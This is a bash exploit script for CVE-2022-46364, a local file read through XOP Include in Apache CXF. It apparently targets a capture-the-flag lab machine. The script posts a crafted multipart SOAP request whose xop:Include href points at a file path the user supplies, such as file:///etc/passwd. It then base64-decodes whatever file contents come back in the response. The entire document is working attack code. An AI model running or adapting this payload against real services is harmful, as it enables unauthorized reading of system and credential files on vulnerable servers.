#!/bin/bash

# ===========================
# CVE-2022-46364 - Apache CXF XOP Include LFI
# ===========================

TARGET="http://10.129.128.3:8080/employeeservice"

if [ -z "$1" ]; then
    echo "Usage: $0 <file_path>"
    echo "Ex:    $0 file:///etc/passwd"
    exit 1
fi

FILE="$1"

RESPONSE=$(curl -s -X POST "$TARGET" \
  -H 'Content-Type: multipart/related; type="application/xop+xml"; start="<root.message@cxf.apache.org>"; start-info="text/xml"; boundary="----=_Part_1"' \
  -d $'------=_Part_1\r\nContent-Type: application/xop+xml; charset=UTF-8; type="text/xml"\r\nContent-Transfer-Encoding: 8bit\r\nContent-ID: <root.message@cxf.apache.org>\r\n\r\n<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:dev="http://devarea.htb/">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <dev:submitReport>\r\n         <arg0>\r\n            <employeeName><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="'"$FILE"'"/></employeeName>\r\n            <department>IT</department>\r\n            <content>test</content>\r\n            <confidential>false</confidential>\r\n         </arg0>\r\n      </dev:submitReport>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>\r\n------=_Part_1--')

B64=$(echo "$RESPONSE" | grep -oP 'from \K[^.]+')

if [ -z "$B64" ]; then
    B64=$(echo "$RESPONSE" | grep -oP '(?<=<employeeName>)[^<]+')
fi

if [ -z "$B64" ]; then
    echo "[!] No content found in response."
    exit 1
fi

echo "[+] File: $FILE"
echo "[+] Content:"
echo "$B64" | base64 -d 2>/dev/null || echo "$B64"
